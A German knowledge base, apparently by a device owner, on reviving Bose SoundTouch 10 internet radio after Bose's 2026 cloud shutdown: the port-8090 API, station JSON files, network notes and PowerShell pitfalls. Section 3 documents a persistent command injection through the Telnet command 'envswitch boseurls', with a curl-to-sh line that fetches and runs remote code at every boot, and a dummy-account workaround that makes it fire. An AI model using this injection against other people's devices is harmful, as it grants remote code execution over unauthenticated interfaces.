# Wissensbasis Bose SoundTouch

Alles, was bei der Analyse und Umsetzung am 09.08.2026 herausgefunden wurde.
Zweck: Dieses Dokument soll ausreichen, um die Loesung ohne den urspruenglichen
Chatverlauf zu verstehen, zu warten und auf weitere Geraete auszurollen.

**Konvention:** Jede Aussage ist markiert als
`[GEPRUEFT]` (live am Geraet oder per HTTP verifiziert),
`[GELESEN]` (aus fremdem Quellcode oder Doku uebernommen) oder
`[ANNAHME]` (plausibel, aber nicht verifiziert).

---

## 1. Ausgangslage

Bose hat den SoundTouch-Cloud-Dienst im Februar 2026 eingestellt und die Server
am 6. Mai 2026 abgeschaltet. `[GELESEN]` Folge: Alle Presets der Quelle `TUNEIN`
sind tot, die Quelle verschwindet aus `/sources`. Die Hardware funktioniert
weiter, AUX und Bluetooth ebenso.

### Das Referenzgeraet

Alles Folgende wurde gegen dieses Modell verifiziert. Werte aus
`http://<box-ip>:8090/info` `[GEPRUEFT]`:

| Feld | Wert |
|---|---|
| Modell | SoundTouch 10 |
| Firmware | `27.0.6.46330.5043500` |
| moduleType | `sm2` |
| variant | `rhino` (Series-II) |

Die Kombination `sm2`/`rhino` ist die am besten dokumentierte Variante. Firmware
27.x ist Voraussetzung fuer alles Folgende. `[GELESEN]`

> In dieser Dokumentation stehen ueberall Beispieladressen aus dem fuer
> Dokumentation reservierten Bereich `192.0.2.0/24` (RFC 5737). Die echte
> Adresse der eigenen Box ermittelt `Find-Soundtouch`.

---

## 2. Geraete-API auf Port 8090

Unverschluesseltes HTTP, XML rein und raus, keine Authentifizierung. Funktioniert
auch ueber VLAN-Grenzen hinweg, solange die Firewall Unicast erlaubt. `[GEPRUEFT]`

| Endpunkt | Methode | Zweck |
|---|---|---|
| `/info` | GET | Modell, Firmware, DeviceID, moduleType, variant |
| `/sources` | GET | Verfuegbare Quellen samt Status |
| `/presets` | GET | Belegung der Tasten 1-6 |
| `/now_playing` | GET | Laufende Wiedergabe |
| `/volume` | GET/POST | `<volume>0</volume>` |
| `/select` | POST | ContentItem sofort abspielen |
| `/storePreset` | POST | Preset schreiben, **ohne** Tastendruck am Geraet |
| `/key` | POST | Tastendruck simulieren, `press` und `release` getrennt |

### Beispiel: Preset schreiben

```xml
<preset id="1">
    <ContentItem source="LOCAL_INTERNET_RADIO" type="stationurl"
                 location="https://example.com/sender.json" isPresetable="true">
        <itemName>Sendername</itemName>
        <containerArt>https://example.com/logo.png</containerArt>
    </ContentItem>
</preset>
```

### Beispiel: Standby schalten

```xml
<key state="press" sender="Gabbo">POWER</key>
<key state="release" sender="Gabbo">POWER</key>
```

### Fallstricke

- **UTF-8 explizit senden.** `Invoke-WebRequest` mit einem String als Body
  verstuemmelt Umlaute in Sendernamen. Body als Byte-Array uebergeben und
  `charset=utf-8` setzen. `[GEPRUEFT]`
- **Antworten koennen Byte-Arrays sein.** Je nach Content-Type liefert
  `Invoke-WebRequest` `.Content` als `byte[]` statt als String. Immer pruefen
  und dekodieren. `[GEPRUEFT]`

---

## 3. Telnet-Konsole auf Port 17000

Kein Shell, sondern ein eigener Kommandoparser. `help` gibt "Command not found",
`cat` existiert nicht, Dateien lassen sich darueber **nicht** lesen. `[GEPRUEFT]`

Bekannte funktionierende Befehle:

| Befehl | Wirkung |
|---|---|
| `network status` | XML mit Interfaces, RSSI, Kanal, Linkspeed |
| `envswitch boseurls set "<a>" "<b>"` | Setzt zwei URL-Felder |
| `sys reboot` | Neustart |

`envswitch boseurls get` gibt "Invalid Command Option" - Lesen geht offenbar
nicht. `[GEPRUEFT]`

### Der Installationsmechanismus

Der Wert von `boseurls` landet irgendwo in einer Shell-Zeile. Ein vorangestelltes
Semikolon beendet den urspruenglichen Befehl, der Rest wird ausgefuehrt. Klassische
Command Injection. `[GEPRUEFT]`

```
envswitch boseurls set ";<beliebiger shell-befehl>" ";<beliebiger shell-befehl>"
sys reboot
```

Antwort des Geraets bei Erfolg:
`Setting Bose Server URLs to <a> and <b>` gefolgt von `OK`. `[GEPRUEFT]`

**Wichtig:** Der Wert bleibt persistent gesetzt. Er wird bei **jedem** Start
ausgefuehrt, nicht nur einmal. `[ANNAHME]` - abgeleitet daraus, dass das
Installationsskript von SoundPloy sich selbst nicht entfernt.

### Die Bedingung, ohne die gar nichts passiert

Der Wert landet im Feld `margeURL`, sichtbar unter `/info`. Er wird aber
**nur dann ausgefuehrt, wenn die Box tatsaechlich einen Marge-Aufruf an die
Bose-Cloud startet** - und das tut sie ausschliesslich, wenn ein Bose-Konto
hinterlegt ist. `[GEPRUEFT]`

Direkter Vergleich zweier baugleicher SoundTouch 10 (beide `rhino`/`sm2`,
Firmware 27.0.6):

| | Box mit Konto | fabrikfrische Box |
|---|---|---|
| `margeAccountUUID` | `5786962` | **leer** |
| `margeURL` nach Injektion | wird ausgefuehrt | `;curl soundploy.gmuth.de/v2_install\|sh` bleibt als toter Text stehen |
| Ergebnis | `Sources.xml` installiert | nichts passiert, auch nach Neustart nicht |

Eine fabrikfrische Box laesst sich auf diesem Weg also **nicht** einrichten.
Der Befehl steht in `margeURL`, aber niemand fuehrt ihn aus.

### Was noetig waere

streborn loest das und beschreibt den Ablauf im Quelltext von
`desktop-app/telnet_bootstrap_marge.go`: `[GELESEN]`

1. Einen Marge-Ersatz auf dem PC starten, der die Box beantwortet.
2. `margeURL` der Box per `envswitch` auf diesen PC zeigen lassen.
3. `POST /setMargeAccount` mit einem Dummy-Konto
   (`<PairDeviceWithAccount><accountId>...</accountId></PairDeviceWithAccount>`).
   Der Aufruf laeuft clientseitig in einen Timeout, die Box speichert das
   Konto aber trotzdem.
4. Warten, bis `margeAccountUUID` wirklich persistiert ist.
5. Erst dann die eigentliche Injektion setzen und neu starten.

Entscheidend laut Quelltext: Das Konto persistiert **nur**, wenn die Box es
gegen einen erreichbaren, wohlgeformten Marge-Server validieren kann. Zeigt
`margeURL` beim Setzen noch auf das tote `streaming.bose.com`, bleibt
`margeAccountUUID` leer.

Praktische Huerde im eigenen Netz: Die Box muss den PC erreichen koennen -
also die Gegenrichtung ueber die VLAN-Grenze, die typischerweise gesperrt
ist.

Der Werkszustand dieser Variable ist **unbekannt**. Es gibt keinen bekannten Weg,
ihn auszulesen. Als harmloser Platzhalter eignet sich `;true`. `[ANNAHME]`

---

## 4. Sender-Aufloesung (BMX)

Die Quelle `LOCAL_INTERNET_RADIO` erwartet in `location` eine URL. Die Box ruft
sie **selbst** ab und erwartet dort JSON in diesem Format:

```json
{
  "name": "Sendername",
  "streamType": "liveRadio",
  "imageUrl": "https://example.com/logo.png",
  "audio": {
    "isRealtime": true,
    "hasPlaylist": false,
    "streamUrl": "https://example.com/stream.mp3"
  }
}
```

### Die zentralen Erkenntnisse

1. **`location` darf eine absolute URL sein.** Sie muss nicht auf den in der
   Registry hinterlegten `baseUrl` zeigen. `[GEPRUEFT]`
2. **Die Box beherrscht HTTPS und akzeptiert oeffentliche Zertifikate.**
   Verifiziert gegen `raw.githubusercontent.com` und
   `all.api.radio-browser.info`. `[GEPRUEFT]`
3. **Es braucht keinerlei Serverlogik.** Eine statische Datei genuegt. Damit ist
   jeder Webspace, jedes GitHub-Repo und jeder lokale Webserver ein gueltiges
   Backend. `[GEPRUEFT]`

Punkt 3 ist der Kern der ganzen Loesung.

### Testbeleg

```
POST /select mit
  location = https://raw.githubusercontent.com/gmuth/soundploy/main/stream-json/take5.json
Antwort /now_playing:
  <playStatus>PLAY_STATE</playStatus>
  <track>Take Five</track>
```

---

## 5. Wo Stream-URLs herkommen

### radio-browser.info

Freie, community-gepflegte Senderdatenbank ohne API-Schluessel.

```
Suche:  https://all.api.radio-browser.info/json/stations/byname/<name>?limit=10&order=clickcount&reverse=true
Detail: https://all.api.radio-browser.info/json/stations/byuuid/<uuid>
```

**Besonderheit:** radio-browser hostet selbst eine SoundTouch-Bruecke, die genau
das oben beschriebene BMX-JSON ausliefert: `[GEPRUEFT]`

```
https://all.api.radio-browser.info/soundtouch/stations/byuuid/<uuid>
```

Das ist ein Nischen-Anbau des Projekts. Er funktioniert, kann aber jederzeit
verschwinden. Genau deshalb liegen die Senderdateien hier im eigenen Repo und
werden nicht zur Laufzeit von dort geholt.

### Fallstrick: ICY statt HTTP

Viele Radiostreams (Shoutcast/Icecast) antworten mit

```
ICY 200 OK
```

statt `HTTP/1.1 200 OK`. `Invoke-WebRequest` und `HttpWebRequest` werten das
als `ServerProtocolViolation` und werfen eine Ausnahme, obwohl der Stream
einwandfrei laeuft. `[GEPRUEFT]`

Eine Pruefung per `Invoke-WebRequest` meldet dadurch massenhaft
Falschmeldungen - bei einem Testlauf 19 von 104 Sendern, von denen sich 18
als voellig gesund herausstellten. `Test-StationStream` im Werkzeug loest
das per Rohsocket: Statuszeile selbst lesen und `ICY 200` als gueltig
akzeptieren.

Kurios: Mit dem User-Agent `VLC/3.0.20` liefern dieselben Server ein sauberes
HTTP-`301` statt ICY. Der User-Agent entscheidet also ueber das Protokoll.

### Fallstrick: befristete Stream-URLs

Mehrere oeffentlich-rechtliche Sender liefern beim Abruf eine Umleitung auf eine
**tokenisierte URL mit Ablaufdatum**: `[GEPRUEFT]`

```
https://liveradio.swr.de/sw282p3/swr4ko/
  -> https://f131.rndfnk.com/ard/swr/swr4/ko/mp3/128/stream.mp3?...&token=0w7tWfh...
```

Wird die aufgeloeste URL gespeichert, ist das Preset nach Stunden tot. Es muss
**immer die stabile Einstiegs-URL** hinterlegt werden. Das Feld `url_resolved`
aus radio-browser ist dafuer ungeeignet; der `/soundtouch/`-Endpunkt liefert die
richtige.

---

## 6. Was SoundPloy genau macht

[gmuth/soundploy](https://github.com/gmuth/soundploy), der Ausgangspunkt.
Ausgeliefert wird `/v2_install` als Byte-Stream, dekodiert: `[GEPRUEFT]`

```sh
cd /mnt/nv/BoseApp-Persistence/1 && curl -Ofs http://soundploy.gmuth.de/Sources.xml
cd /mnt/nv && curl -Ofs http://soundploy.gmuth.de/OverrideSdkPrivateCfg.xml
sed -i s#https://content.api.bose.io/core02/svc-bmx-adapter-orion/prod/orion##g \
    /mnt/nv/BoseApp-Persistence/1/Presets.xml
reboot
```

### Die beiden Dateien

`/mnt/nv/BoseApp-Persistence/1/Sources.xml` schaltet Quellen frei:

```xml
<sources>
    <source displayName="AUX IN"><sourceKey type="AUX" account="AUX" /></source>
    <source secretType="token"><sourceKey type="TUNEIN" account="" /></source>
    <source secretType="token"><sourceKey type="LOCAL_INTERNET_RADIO" account="" /></source>
</sources>
```

`/mnt/nv/OverrideSdkPrivateCfg.xml` steuert, wohin die Box telefoniert:

```xml
<SoundTouchSdkPrivateCfg>
    <margeServerUrl>http://no-marge</margeServerUrl>
    <statsServerUrl>http://no-stats</statsServerUrl>
    <swUpdateUrl>http://no-swupdate</swUpdateUrl>
    <bmxRegistryUrl>http://soundploy.gmuth.de/v2/registry.json</bmxRegistryUrl>
</SoundTouchSdkPrivateCfg>
```

### Warum das nicht die Endloesung ist

- Dauerhafter Boot-Hook auf einen fremden Server, **unverschluesseltes HTTP**.
  Wer die Domain kontrolliert oder den Verkehr manipuliert, fuehrt Code auf dem
  Lautsprecher aus.
- Die Registry wird laut `askAgainAfter: 86400` etwa taeglich neu geholt. Faellt
  der Server aus, faellt die Quelle vermutlich weg. `[ANNAHME]`
- Der Server blockt Fremdaufrufe mit HTTP 403 und ist deshalb nicht testbar.
  `[GEPRUEFT]`

### Der Preis der Installation

Das Ueberschreiben von `Sources.xml` **entfernt die Spotify-Verknuepfung**.
Vorher `SPOTIFY / status=READY` mit verknuepftem Konto, nachher nur noch
`SpotifyConnectUserName` und `SpotifyAlexaUserName` mit `UNAVAILABLE`.
`[GEPRUEFT]`

Da gleichzeitig `margeServerUrl` totgelegt wird, ist ein Neu-Verknuepfen ueber
den Bose-Kontoserver vermutlich nicht mehr moeglich. `[ANNAHME]`
AUX, ALEXA und TUNEIN bleiben `READY`.

---

## 7. Die Alternative: streborn

[JRpersonal/streborn](https://github.com/JRpersonal/streborn), MIT, deutlich
umfangreicher. Ein Go-Agent laeuft **auf der Box** und baut die Bose-Cloud lokal
nach: Bose-Hostnamen werden per `/etc/hosts` auf `127.0.0.1` gepinnt, dazu ein
selbst erzeugtes TLS-Zertifikat im Trust Store des Geraets. `[GELESEN]`

Bringt zusaetzlich: Spotify Connect (go-librespot), DLNA/UPnP, Multiroom,
Hardware-Tasten, Webhooks Richtung Home Assistant.

SoundTouch 10 `sm2`/`rhino` ist dort als **"Verified"** gelistet, Firmware 27.0.6
ist das erklaerte Ziel. `[GELESEN]`

### Nuetzliche Details daraus

- streborn nutzt **dieselbe** `envswitch boseurls`-Mechanik fuer seinen Bootstrap
  und setzt sie danach auf Werkszustand zurueck. Ein bestehender SoundPloy-Hook
  wird also ueberschrieben. `[GELESEN]`
- WLAN: `buildWPAConfig` schreibt genau **einen** `network={}`-Block. Mehrere
  gespeicherte WLANs sind nicht vorgesehen, ein Wechsel ersetzt das alte.
  Rollback-Kopie unter `/mnt/nv/streborn/wpa_supplicant.conf.bak`. `[GELESEN]`
- Der ST10 gehoert zur "wpa-Klasse": echtes `wlan0`, Agent direkt auf `:8888`.
  Andere Modelle haengen an einem Koprozessor und sind nur ueber `:17008`
  erreichbar. `[GELESEN]`
- Der Agent bringt eine eigene Weboberflaeche auf Port 8888 mit, im Browser
  erreichbar. `[ANNAHME]` - aus Dateistruktur abgeleitet, nicht ausprobiert.

### Warum hier trotzdem der Eigenbau

Bewusste Entscheidung: Root-Binary auf dem Geraet gegen fuenf statische
Textdateien. Wer Spotify, Multiroom oder DLNA auf der Box braucht, ist mit
streborn besser bedient.

---

## 8. Netzwerk

Getestet mit der Box in einem separaten IoT-VLAN und dem Arbeitsplatz in
einem anderen Netz. Die Erkenntnisse gelten allgemein:

- **Unicast funktioniert ueber VLAN-Grenzen hinweg**, sofern die Firewall es
  zulaesst. Ports 8090 und 17000 sind so erreichbar. `[GEPRUEFT]`
- **mDNS funktioniert nicht ueber VLAN-Grenzen.** Jedes Werkzeug, das Boxen per
  mDNS sucht, findet dann nichts. Deshalb wird hier per TCP-Connect auf Port
  8090 gescannt. `[GEPRUEFT]`
- Die Box braucht ausgehend Internet fuer die Streams. Ein filternder
  DNS-Dienst stoerte dabei nicht. `[GEPRUEFT]`
- Der SoundTouch 10 funkt auf 2,4 GHz. Fuer 128-kbit-Radio genuegt auch eine
  maessige Verbindung problemlos. `[GEPRUEFT]`

---

## 9. Weitere Fallstricke

- **Private Repos gehen nicht.** `raw.githubusercontent.com` liefert private
  Inhalte nur mit Token aus, und die Box kann keinen mitschicken. Das Repo
  **muss oeffentlich** sein. `[GEPRUEFT]`
- **GitHub leitet HTTP auf HTTPS um** (301). Ein `curl` ohne `-L` folgt dem
  nicht. Ob der curl auf der Box HTTPS ueberhaupt beherrscht, ist unbekannt -
  deshalb ist der `sed`-Weg ohne Download vorzuziehen. `[GEPRUEFT]` /
  `[ANNAHME]`
- **GitHub Pages liefert die JSON-Dateien nur mit `.nojekyll`.** Ohne diese
  Datei verarbeitet Jekyll das Repo, die Wurzel wird als HTML ausgeliefert,
  aber `registry.json` und `stations/*.json` geben 404. `[GEPRUEFT]`
- **JSON ohne BOM schreiben.** PowerShell setzt sonst gern ein UTF-8-BOM davor.
  `[System.IO.File]::WriteAllText` mit `UTF8Encoding($false)` verwenden.

### PowerShell 5.1 im Besonderen

- **`ConvertFrom-Json` reicht ein Array als EIN Objekt durch die Pipeline.**
  Das ist der teuerste Stolperstein des ganzen Projekts:

  ```powershell
  @($json | ConvertFrom-Json).Count      # -> 1, egal ob 3 oder 300 Eintraege
  $x = $json | ConvertFrom-Json
  @($x).Count                            # -> 3 bzw. 300, korrekt
  ```

  Ein `foreach ($s in @($json | ConvertFrom-Json))` laeuft genau einmal
  durch, mit dem gesamten Array als `$s`. Zugriffe wie `[string]$s.name`
  liefern dann alle Namen aneinandergehaengt - und erzeugen eine Datei mit
  einem 48 Zeichen langen Slug aus 300 Sendernamen. Immer erst zuweisen,
  dann `@()`. In PowerShell 7 verhaelt es sich anders, dort wird
  aufgeklappt. `[GEPRUEFT]` auf 5.1.26100.8972
- **`String.Replace` hat keine Ueberladung `(char, string)`.**
  `$s.Replace([char]0x00E4, "ae")` wirft zur Laufzeit. Beide Argumente
  muessen Strings sein: `$s.Replace([string][char]0x00E4, "ae")`.
- **`param()` muss die allererste Anweisung sein.** Ein Versionsheader mit
  `$version = "..."` davor macht den Block ungueltig ("Unerwartetes
  Attribut CmdletBinding"). Entweder `param()` nach oben oder ganz darauf
  verzichten.
- **`$home` ist in PowerShell schreibgeschuetzt.** Als Variablenname fuer eine
  Homepage-URL unbrauchbar, es gibt einen stillen Fehler und den Pfad des
  Benutzerprofils.
- **`Set-StrictMode -Version Latest` bleibt beim Dot-Sourcing in der Sitzung
  haengen** und laesst danach fremde Aufrufe ueber `$LASTEXITCODE` stolpern.
  Kosmetisch, aber verwirrend.

---

## 10. Verifikationsstand

| Aussage | Stand |
|---|---|
| Box spielt statische JSON-Datei von GitHub per HTTPS | GEPRUEFT |
| GitHub-Zertifikat wird akzeptiert | GEPRUEFT |
| `location` darf absolut sein | GEPRUEFT |
| Presets per `/storePreset` schreibbar | GEPRUEFT |
| Alle 104 Senderdateien liefern einen erreichbaren Stream | GEPRUEFT |
| `hidebroken=true` bei radio-browser garantiert keine lebende URL | GEPRUEFT (technobase-fm: Host loeste nicht mehr auf) |
| Spotify-Verknuepfung geht bei SoundPloy verloren | GEPRUEFT |
| Umstellung der Presets auf das eigene Repo, Wiedergabe bestaetigt | GEPRUEFT (09.08.2026) |
| Registry per `sed` ueber den Boot-Hook umbiegbar | GEPRUEFT |
| Box arbeitet mit `bmxRegistryUrl` ueber **HTTPS** | WAHRSCHEINLICH, siehe unten |
| `curl` auf der Box kann HTTPS | **OFFEN** (nicht mehr noetig, der sed-Weg kommt ohne aus) |
| Boot-Hook feuert bei jedem Start | ANNAHME |
| `;true` ist ein sicherer Platzhalter fuer `boseurls` | ANNAHME (ungetestet) |

### Zur Registry ueber HTTPS

Nach dem Umbiegen auf
`https://raw.githubusercontent.com/fkappen/bose/main/registry.json` und einem
Neustart blieb `LOCAL_INTERNET_RADIO` auf `status="READY"`, und die Presets
spielen. Das ist mit einer funktionierenden HTTPS-Registry vereinbar.

**Es ist aber kein Beweis.** Die Box koennte die Service-Registrierung aus
ihrem eigenen Zustand bedienen, ohne neu abzurufen - `askAgainAfter` steht auf
86400 Sekunden. Ob die Registry wirklich von GitHub geholt wird, zeigt sich
fruehestens 24 Stunden nach der Umstellung. Bleibt die Quelle dann `READY`,
ist die Sache klar.

Ein Fehlschlag waere ungefaehrlich und leicht zu beheben: dasselbe `sed` in
Gegenrichtung zeigt wieder auf den alten Server.

---

## 11. Zeitleiste

| Datum | Ereignis |
|---|---|
| Feb 2026 | Bose kuendigt Einstellung des Cloud-Dienstes an |
| 06.05.2026 | Server endgueltig abgeschaltet |
| 09.08.2026 | SoundPloy installiert, Presets ueber radio-browser wiederhergestellt, Spotify dabei verloren |
| 09.08.2026 | Umstieg auf dieses Repo beschlossen |
